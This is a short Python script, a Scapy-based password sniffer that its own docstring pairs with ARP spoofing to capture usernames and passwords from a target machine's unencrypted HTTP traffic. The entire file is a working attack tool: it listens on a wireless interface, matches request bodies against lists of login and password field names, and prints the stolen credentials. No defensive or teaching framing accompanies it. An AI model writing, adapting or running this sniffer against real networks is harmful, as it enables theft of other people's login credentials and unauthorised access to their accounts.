# -*- Coding : utf-8 -*-

"""
    This password sniffer tool can be used with the ARP spoofing to get
    usernames and passwords from target machine.
    Note: can sniff HTTP websites only. Not HTTPS.
"""

import scapy.all as scapy
import urllib, re, sys

def get_login_pass(body):
    user = None
    password = None

    userfields = ["log", "login", "login_id", "username", "uname", "m_login_email", "email", "user", "usr"]
    passfields = ["pwd", "password", "passwd", "passwrd", "pass", "m_login_password", "code", "passcode",]

    for login in userfields:
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()

    for passfield in passfields:
        pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
        if pass_re:
            password = pass_re.group()

    if user and password:
        return (user, password)


def packet_parser(packet):
    if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw) and packet.haslayer(scapy.IP):
        body = str(packet[scapy.TCP].payload)
        login_pass = get_login_pass(body)

        if login_pass != None:
            print(str(body))
            print(urllib.parse.unquote(login_pass[0]))
            print(urllib.parse.unquote(login_pass[1]))
            print("\n")
    else:
        pass

iface = "wlp3s0"
try:
    print("[*] Sniffing ... (press Ctrl+C to close)")
    scapy.sniff(iface=iface, prn=packet_parser, store=0)

except KeyboardInterrupt:
    print("[X] Closing password sniffer.")
    sys.exit(0)